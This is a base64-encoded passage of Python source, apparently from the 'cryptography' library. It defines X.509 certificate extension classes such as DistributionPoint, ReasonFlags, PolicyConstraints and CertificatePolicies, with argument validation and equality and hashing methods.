pZCA9IEV4dGVuc2lvbk9JRC5GUkVTSEVTVF9DUkxcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgZGlzdHJpYnV0aW9uX3BvaW50czogdHlwaW5nLkl0ZXJhYmxlWyJEaXN0cmlidXRpb25Qb2ludCJdXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgZGlzdHJpYnV0aW9uX3BvaW50cyA9IGxpc3QoZGlzdHJpYnV0aW9uX3BvaW50cylcclxuICAgICAgICBpZiBub3QgYWxsKFxyXG4gICAgICAgICAgICBpc2luc3RhbmNlKHgsIERpc3RyaWJ1dGlvblBvaW50KSBmb3IgeCBpbiBkaXN0cmlidXRpb25fcG9pbnRzXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgImRpc3RyaWJ1dGlvbl9wb2ludHMgbXVzdCBiZSBhIGxpc3Qgb2YgRGlzdHJpYnV0aW9uUG9pbnQgIlxyXG4gICAgICAgICAgICAgICAgIm9iamVjdHMiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fZGlzdHJpYnV0aW9uX3BvaW50cyA9IGRpc3RyaWJ1dGlvbl9wb2ludHNcclxuXHJcbiAgICBfX2xlbl9fLCBfX2l0ZXJfXywgX19nZXRpdGVtX18gPSBfbWFrZV9zZXF1ZW5jZV9tZXRob2RzKFxyXG4gICAgICAgICJfZGlzdHJpYnV0aW9uX3BvaW50cyJcclxuICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPEZyZXNoZXN0Q1JMKHt9KT4iLmZvcm1hdChzZWxmLl9kaXN0cmlidXRpb25fcG9pbnRzKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgRnJlc2hlc3RDUkwpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Rpc3RyaWJ1dGlvbl9wb2ludHMgPT0gb3RoZXIuX2Rpc3RyaWJ1dGlvbl9wb2ludHNcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHR1cGxlKHNlbGYuX2Rpc3RyaWJ1dGlvbl9wb2ludHMpKVxyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgRGlzdHJpYnV0aW9uUG9pbnQ6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBmdWxsX25hbWU6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuSXRlcmFibGVbR2VuZXJhbE5hbWVdXSxcclxuICAgICAgICByZWxhdGl2ZV9uYW1lOiB0eXBpbmcuT3B0aW9uYWxbUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZV0sXHJcbiAgICAgICAgcmVhc29uczogdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5Gcm96ZW5TZXRbIlJlYXNvbkZsYWdzIl1dLFxyXG4gICAgICAgIGNybF9pc3N1ZXI6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuSXRlcmFibGVbR2VuZXJhbE5hbWVdXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBmdWxsX25hbWUgYW5kIHJlbGF0aXZlX25hbWU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiWW91IGNhbm5vdCBwcm92aWRlIGJvdGggZnVsbF9uYW1lIGFuZCByZWxhdGl2ZV9uYW1lLCBhdCAiXHJcbiAgICAgICAgICAgICAgICAibGVhc3Qgb25lIG11c3QgYmUgTm9uZS4iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgZnVsbF9uYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBmdWxsX25hbWUgPSBsaXN0KGZ1bGxfbmFtZSlcclxuICAgICAgICAgICAgaWYgbm90IGFsbChpc2luc3RhbmNlKHgsIEdlbmVyYWxOYW1lKSBmb3IgeCBpbiBmdWxsX25hbWUpOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJmdWxsX25hbWUgbXVzdCBiZSBhIGxpc3Qgb2YgR2VuZXJhbE5hbWUgb2JqZWN0cyJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgcmVsYXRpdmVfbmFtZTpcclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocmVsYXRpdmVfbmFtZSwgUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZSk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgInJlbGF0aXZlX25hbWUgbXVzdCBiZSBhIFJlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWUiXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIGNybF9pc3N1ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGNybF9pc3N1ZXIgPSBsaXN0KGNybF9pc3N1ZXIpXHJcbiAgICAgICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBHZW5lcmFsTmFtZSkgZm9yIHggaW4gY3JsX2lzc3Vlcik6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgImNybF9pc3N1ZXIgbXVzdCBiZSBOb25lIG9yIGEgbGlzdCBvZiBnZW5lcmFsIG5hbWVzIlxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiByZWFzb25zIGFuZCAoXHJcbiAgICAgICAgICAgIG5vdCBpc2luc3RhbmNlKHJlYXNvbnMsIGZyb3plbnNldClcclxuICAgICAgICAgICAgb3Igbm90IGFsbChpc2luc3RhbmNlKHgsIFJlYXNvbkZsYWdzKSBmb3IgeCBpbiByZWFzb25zKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigicmVhc29ucyBtdXN0IGJlIE5vbmUgb3IgZnJvemVuc2V0IG9mIFJlYXNvbkZsYWdzIilcclxuXHJcbiAgICAgICAgaWYgcmVhc29ucyBhbmQgKFxyXG4gICAgICAgICAgICBSZWFzb25GbGFncy51bnNwZWNpZmllZCBpbiByZWFzb25zXHJcbiAgICAgICAgICAgIG9yIFJlYXNvbkZsYWdzLnJlbW92ZV9mcm9tX2NybCBpbiByZWFzb25zXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ1bnNwZWNpZmllZCBhbmQgcmVtb3ZlX2Zyb21fY3JsIGFyZSBub3QgdmFsaWQgcmVhc29ucyBpbiBhICJcclxuICAgICAgICAgICAgICAgICJEaXN0cmlidXRpb25Qb2ludCJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiByZWFzb25zIGFuZCBub3QgY3JsX2lzc3VlciBhbmQgbm90IChmdWxsX25hbWUgb3IgcmVsYXRpdmVfbmFtZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiWW91IG11c3Qgc3VwcGx5IGNybF9pc3N1ZXIsIGZ1bGxfbmFtZSwgb3IgcmVsYXRpdmVfbmFtZSB3aGVuICJcclxuICAgICAgICAgICAgICAgICJyZWFzb25zIGlzIG5vdCBOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2Z1bGxfbmFtZSA9IGZ1bGxfbmFtZVxyXG4gICAgICAgIHNlbGYuX3JlbGF0aXZlX25hbWUgPSByZWxhdGl2ZV9uYW1lXHJcbiAgICAgICAgc2VsZi5fcmVhc29ucyA9IHJlYXNvbnNcclxuICAgICAgICBzZWxmLl9jcmxfaXNzdWVyID0gY3JsX2lzc3VlclxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxEaXN0cmlidXRpb25Qb2ludChmdWxsX25hbWU9ezAuZnVsbF9uYW1lfSwgcmVsYXRpdmVfbmFtZT17MC5yZWxhIlxyXG4gICAgICAgICAgICAidGl2ZV9uYW1lfSwgcmVhc29ucz17MC5yZWFzb25zfSwgIlxyXG4gICAgICAgICAgICAiY3JsX2lzc3Vlcj17MC5jcmxfaXNzdWVyfSk+Ii5mb3JtYXQoc2VsZilcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBEaXN0cmlidXRpb25Qb2ludCk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLmZ1bGxfbmFtZSA9PSBvdGhlci5mdWxsX25hbWVcclxuICAgICAgICAgICAgYW5kIHNlbGYucmVsYXRpdmVfbmFtZSA9PSBvdGhlci5yZWxhdGl2ZV9uYW1lXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnJlYXNvbnMgPT0gb3RoZXIucmVhc29uc1xyXG4gICAgICAgICAgICBhbmQgc2VsZi5jcmxfaXNzdWVyID09IG90aGVyLmNybF9pc3N1ZXJcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICBpZiBzZWxmLmZ1bGxfbmFtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgZm46IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuVHVwbGVbR2VuZXJhbE5hbWUsIC4uLl1dID0gdHVwbGUoXHJcbiAgICAgICAgICAgICAgICBzZWxmLmZ1bGxfbmFtZVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgZm4gPSBOb25lXHJcblxyXG4gICAgICAgIGlmIHNlbGYuY3JsX2lzc3VlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgY3JsX2lzc3VlcjogdHlwaW5nLk9wdGlvbmFsW1xyXG4gICAgICAgICAgICAgICAgdHlwaW5nLlR1cGxlW0dlbmVyYWxOYW1lLCAuLi5dXHJcbiAgICAgICAgICAgIF0gPSB0dXBsZShzZWxmLmNybF9pc3N1ZXIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgY3JsX2lzc3VlciA9IE5vbmVcclxuXHJcbiAgICAgICAgcmV0dXJuIGhhc2goKGZuLCBzZWxmLnJlbGF0aXZlX25hbWUsIHNlbGYucmVhc29ucywgY3JsX2lzc3VlcikpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZnVsbF9uYW1lKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuTGlzdFtHZW5lcmFsTmFtZV1dOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9mdWxsX25hbWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByZWxhdGl2ZV9uYW1lKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtSZWxhdGl2ZURpc3Rpbmd1aXNoZWROYW1lXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVsYXRpdmVfbmFtZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJlYXNvbnMoc2VsZikgLT4gdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5Gcm96ZW5TZXRbIlJlYXNvbkZsYWdzIl1dOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yZWFzb25zXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY3JsX2lzc3VlcihzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbR2VuZXJhbE5hbWVdXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3JsX2lzc3VlclxyXG5cclxuXHJcbmNsYXNzIFJlYXNvbkZsYWdzKHV0aWxzLkVudW0pOlxyXG4gICAgdW5zcGVjaWZpZWQgPSAidW5zcGVjaWZpZWQiXHJcbiAgICBrZXlfY29tcHJvbWlzZSA9ICJrZXlDb21wcm9taXNlIlxyXG4gICAgY2FfY29tcHJvbWlzZSA9ICJjQUNvbXByb21pc2UiXHJcbiAgICBhZmZpbGlhdGlvbl9jaGFuZ2VkID0gImFmZmlsaWF0aW9uQ2hhbmdlZCJcclxuICAgIHN1cGVyc2VkZWQgPSAic3VwZXJzZWRlZCJcclxuICAgIGNlc3NhdGlvbl9vZl9vcGVyYXRpb24gPSAiY2Vzc2F0aW9uT2ZPcGVyYXRpb24iXHJcbiAgICBjZXJ0aWZpY2F0ZV9ob2xkID0gImNlcnRpZmljYXRlSG9sZCJcclxuICAgIHByaXZpbGVnZV93aXRoZHJhd24gPSAicHJpdmlsZWdlV2l0aGRyYXduIlxyXG4gICAgYWFfY29tcHJvbWlzZSA9ICJhQUNvbXByb21pc2UiXHJcbiAgICByZW1vdmVfZnJvbV9jcmwgPSAicmVtb3ZlRnJvbUNSTCJcclxuXHJcblxyXG4jIFRoZXNlIGFyZSBkaXN0cmlidXRpb24gcG9pbnQgYml0IHN0cmluZyBtYXBwaW5ncy4gTm90IHRvIGJlIGNvbmZ1c2VkIHdpdGhcclxuIyBDUkxSZWFzb24gcmVhc29uIGZsYWdzIGJpdCBzdHJpbmcgbWFwcGluZ3MuXHJcbiMgUmVhc29uRmxhZ3MgOjo9IEJJVCBTVFJJTkcge1xyXG4jICAgICAgdW51c2VkICAgICAgICAgICAgICAgICAgKDApLFxyXG4jICAgICAga2V5Q29tcHJvbWlzZSAgICAgICAgICAgKDEpLFxyXG4jICAgICAgY0FDb21wcm9taXNlICAgICAgICAgICAgKDIpLFxyXG4jICAgICAgYWZmaWxpYXRpb25DaGFuZ2VkICAgICAgKDMpLFxyXG4jICAgICAgc3VwZXJzZWRlZCAgICAgICAgICAgICAgKDQpLFxyXG4jICAgICAgY2Vzc2F0aW9uT2ZPcGVyYXRpb24gICAgKDUpLFxyXG4jICAgICAgY2VydGlmaWNhdGVIb2xkICAgICAgICAgKDYpLFxyXG4jICAgICAgcHJpdmlsZWdlV2l0aGRyYXduICAgICAgKDcpLFxyXG4jICAgICAgYUFDb21wcm9taXNlICAgICAgICAgICAgKDgpIH1cclxuX1JFQVNPTl9CSVRfTUFQUElORyA9IHtcclxuICAgIDE6IFJlYXNvbkZsYWdzLmtleV9jb21wcm9taXNlLFxyXG4gICAgMjogUmVhc29uRmxhZ3MuY2FfY29tcHJvbWlzZSxcclxuICAgIDM6IFJlYXNvbkZsYWdzLmFmZmlsaWF0aW9uX2NoYW5nZWQsXHJcbiAgICA0OiBSZWFzb25GbGFncy5zdXBlcnNlZGVkLFxyXG4gICAgNTogUmVhc29uRmxhZ3MuY2Vzc2F0aW9uX29mX29wZXJhdGlvbixcclxuICAgIDY6IFJlYXNvbkZsYWdzLmNlcnRpZmljYXRlX2hvbGQsXHJcbiAgICA3OiBSZWFzb25GbGFncy5wcml2aWxlZ2Vfd2l0aGRyYXduLFxyXG4gICAgODogUmVhc29uRmxhZ3MuYWFfY29tcHJvbWlzZSxcclxufVxyXG5cclxuXHJcbmNsYXNzIFBvbGljeUNvbnN0cmFpbnRzKEV4dGVuc2lvblR5cGUpOlxyXG4gICAgb2lkID0gRXh0ZW5zaW9uT0lELlBPTElDWV9DT05TVFJBSU5UU1xyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJlcXVpcmVfZXhwbGljaXRfcG9saWN5OiB0eXBpbmcuT3B0aW9uYWxbaW50XSxcclxuICAgICAgICBpbmhpYml0X3BvbGljeV9tYXBwaW5nOiB0eXBpbmcuT3B0aW9uYWxbaW50XSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiByZXF1aXJlX2V4cGxpY2l0X3BvbGljeSBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHJlcXVpcmVfZXhwbGljaXRfcG9saWN5LCBpbnRcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAicmVxdWlyZV9leHBsaWNpdF9wb2xpY3kgbXVzdCBiZSBhIG5vbi1uZWdhdGl2ZSBpbnRlZ2VyIG9yICJcclxuICAgICAgICAgICAgICAgICJOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIGlmIGluaGliaXRfcG9saWN5X21hcHBpbmcgaXMgbm90IE5vbmUgYW5kIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBpbmhpYml0X3BvbGljeV9tYXBwaW5nLCBpbnRcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiaW5oaWJpdF9wb2xpY3lfbWFwcGluZyBtdXN0IGJlIGEgbm9uLW5lZ2F0aXZlIGludGVnZXIgb3IgTm9uZSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBpbmhpYml0X3BvbGljeV9tYXBwaW5nIGlzIE5vbmUgYW5kIHJlcXVpcmVfZXhwbGljaXRfcG9saWN5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiQXQgbGVhc3Qgb25lIG9mIHJlcXVpcmVfZXhwbGljaXRfcG9saWN5IGFuZCAiXHJcbiAgICAgICAgICAgICAgICAiaW5oaWJpdF9wb2xpY3lfbWFwcGluZyBtdXN0IG5vdCBiZSBOb25lIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3JlcXVpcmVfZXhwbGljaXRfcG9saWN5ID0gcmVxdWlyZV9leHBsaWNpdF9wb2xpY3lcclxuICAgICAgICBzZWxmLl9pbmhpYml0X3BvbGljeV9tYXBwaW5nID0gaW5oaWJpdF9wb2xpY3lfbWFwcGluZ1xyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgIjxQb2xpY3lDb25zdHJhaW50cyhyZXF1aXJlX2V4cGxpY2l0X3BvbGljeT17MC5yZXF1aXJlX2V4cGxpY2l0IlxyXG4gICAgICAgICAgICAiX3BvbGljeX0sIGluaGliaXRfcG9saWN5X21hcHBpbmc9ezAuaW5oaWJpdF9wb2xpY3lfIlxyXG4gICAgICAgICAgICAibWFwcGluZ30pPiIuZm9ybWF0KHNlbGYpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUG9saWN5Q29uc3RyYWludHMpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5yZXF1aXJlX2V4cGxpY2l0X3BvbGljeSA9PSBvdGhlci5yZXF1aXJlX2V4cGxpY2l0X3BvbGljeVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5pbmhpYml0X3BvbGljeV9tYXBwaW5nID09IG90aGVyLmluaGliaXRfcG9saWN5X21hcHBpbmdcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChcclxuICAgICAgICAgICAgKHNlbGYucmVxdWlyZV9leHBsaWNpdF9wb2xpY3ksIHNlbGYuaW5oaWJpdF9wb2xpY3lfbWFwcGluZylcclxuICAgICAgICApXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVxdWlyZV9leHBsaWNpdF9wb2xpY3koc2VsZikgLT4gdHlwaW5nLk9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlcXVpcmVfZXhwbGljaXRfcG9saWN5XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaW5oaWJpdF9wb2xpY3lfbWFwcGluZyhzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbaW50XTpcclxuICAgICAgICByZXR1cm4gc2VsZi5faW5oaWJpdF9wb2xpY3lfbWFwcGluZ1xyXG5cclxuICAgIGRlZiBwdWJsaWNfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHJ1c3RfeDUwOS5lbmNvZGVfZXh0ZW5zaW9uX3ZhbHVlKHNlbGYpXHJcblxyXG5cclxuY2xhc3MgQ2VydGlmaWNhdGVQb2xpY2llcyhFeHRlbnNpb25UeXBlKTpcclxuICAgIG9pZCA9IEV4dGVuc2lvbk9JRC5DRVJUSUZJQ0FURV9QT0xJQ0lFU1xyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwb2xpY2llczogdHlwaW5nLkl0ZXJhYmxlWyJQb2xpY3lJbmZvcm1hdGlvbiJdKSAtPiBOb25lOlxyXG4gICAgICAgIHBvbGljaWVzID0gbGlzdChwb2xpY2llcylcclxuICAgICAgICBpZiBub3QgYWxsKGlzaW5zdGFuY2UoeCwgUG9saWN5SW5mb3JtYXRpb24pIGZvciB4IGluIHBvbGljaWVzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkV2ZXJ5IGl0ZW0gaW4gdGhlIHBvbGljaWVzIGxpc3QgbXVzdCBiZSBhICJcclxuICAgICAgICAgICAgICAgICJQb2xpY3lJbmZvcm1hdGlvbiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9wb2xpY2llcyA9IHBvbGljaWVzXHJcblxyXG4gICAgX19sZW5fXywgX19pdGVyX18sIF9fZ2V0aXRlbV9fID0gX21ha2Vfc2VxdWVuY2VfbWV0aG9kcygiX3BvbGljaWVzIilcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPENlcnRpZmljYXRlUG9saWNpZXMoe30pPiIuZm9ybWF0KHNlbGYuX3BvbGljaWVzKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgQ2VydGlmaWNhdGVQb2xpY2llcyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fcG9saWNpZXMgPT0gb3RoZXIuX3BvbGljaWVzXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCh0dXBsZShzZWxmLl9wb2xpY2llcykpXHJcblxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gcnVzdF94NTA5LmVuY29kZV9leHRlbnNpb25fdmFsdWUoc2VsZilcclxuXHJcblxyXG5jbGFzcyBQb2xpY3lJbmZvcm1hdGlvbjpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHBvbGljeV9pZGVudGlmaWVyOiBPYmplY3RJZGVudGlmaWVyLFxyXG4gICAgICAgIHBvbGljeV9xdWFsaWZpZXJzOiB0eXBpbmcuT3B0aW9uYWxbXHJcbiAgICAgICAgICAgIHR5cGluZy5JdGVyYWJsZVt0eXBpbmcuVW5pb25bc3RyLCAiVXNlck5vdGljZSJdXVxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UocG9saWN5X2lkZW50aWZpZXIsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInBvbGljeV9pZGVudGlmaWVyIG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciIpXHJcblxyXG4gICAgICAgIHNlbGYuX3BvbGljeV9pZGVudGlmaWVyID0gcG9saWN5X2lkZW50aWZpZXJcclxuXHJcbiAgICAgICAgaWYgcG9saWN5X3F1YWxpZmllcnMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHBvbGljeV9xdWFsaWZpZXJzID0gbGlzdChwb2xpY3lfcXVhbGlmaWVycylcclxuICAgICAgICAgICAgaWYgbm90IGFsbChcclxuICAgICAgICAgICAgICAgIGlzaW5zdGFuY2UoeCwgKHN0ciwgVXNlck5vdGljZSkpIGZvciB4IGluIHBvbGljeV9xdWFsaWZpZXJzXHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgInBvbGljeV9xdWFsaWZpZXJzIG11c3QgYmUgYSBsaXN0IG9mIHN0cmluZ3MgYW5kL29yICJcclxuICAgICAgICAgICAgICAgICAgICAiVXNlck5vdGljZSBvYmplY3RzIG9yIE5vbmUiXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX3BvbGljeV9xdWFsaWZpZXJzID0gcG9saWN5X3F1YWxpZmllcnNcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICI8UG9saWN5SW5mb3JtYXRpb24ocG9saWN5X2lkZW50aWZpZXI9ezAucG9saWN5X2lkZW50aWZpZXJ9LCBwb2xpYyJcclxuICAgICAgICAgICAgInlfcXVhbGlmaWVycz17MC5wb2xpY3lfcXVhbGlmaWVyc30pPiIuZm9ybWF0KHNlbGYpXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUG9saWN5SW5mb3JtYXRpb24pOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5wb2xpY3lfaWRlbnRpZmllciA9PSBvdGhlci5wb2xpY3lfaWRlbnRpZmllclxyXG4gICAgICAgICAgICBhbmQgc2VsZi5wb2xpY3lfcXVhbGlmaWVycyA9PSBvdGhlci5wb2xpY3lfcXVhbGlmaWVyc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIGlmIHNlbGYucG9saWN5X3F1YWxpZmllcnMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHBxOiB0eXBpbmcuT3B0aW9uYWxbXHJcbiAgICAgICAgICAgICAgICB0eXBpbmcuVHVwbGVbdHlwaW5nLlVuaW9uW3N0ciwgIlVzZXJOb3RpY2UiXSwgLi4uXVxyXG4gICAgICAgICAgICBdID0gdHVwbGUoc2VsZi5wb2xpY3lfcXVhbGlmaWVycylcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBwcSA9IE5vbmVcclxuXHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYucG9saWN5X2lkZW50aWZpZXIsIHBxKSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwb2xpY3lfaWRlbnRpZmllcihzZWxmKSAtPiBPYmplY3RJZGVudGlmaWVyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9wb2xpY3lfaWRlbnRpZmllclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBvbGljeV9xdWFsaWZpZXJzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICApIC0+IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuTGlzdFt0eXBpbmcuVW5pb25bc3RyLCAiVXNlck5vdGljZSJdXV06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3BvbGljeV9xdWFsaWZpZXJzXHJcblxyXG5cclxuY2xhc3MgVXNlck5vdGljZTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG5vdGljZV9yZWZlcmVuY2U6IHR5cGluZy5PcHRpb25hbFsiTm90aWNlUmVmZXJlbmNl